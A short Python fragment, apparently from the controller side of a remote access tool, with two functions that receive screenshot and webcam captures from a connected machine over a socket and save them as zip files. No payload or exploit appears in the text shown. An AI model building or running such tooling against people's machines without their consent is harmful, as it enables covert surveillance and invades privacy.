
def snapshot(my_socket):
    print("\t\t[+] Taking a screen shot")
    new_name = input("[+] Enter filename to be saved, default [screenshot.zip]: ")
    if new_name == "":
        new_name = "screenshot.zip"
    else:
        new_name = new_name + ".zip"
    my_socket.receive_file(new_name)

def capture_webcam(my_socket):
    print("\t\t[+] Taking shot from webcam")
    my_socket.receive_file("test.zip")

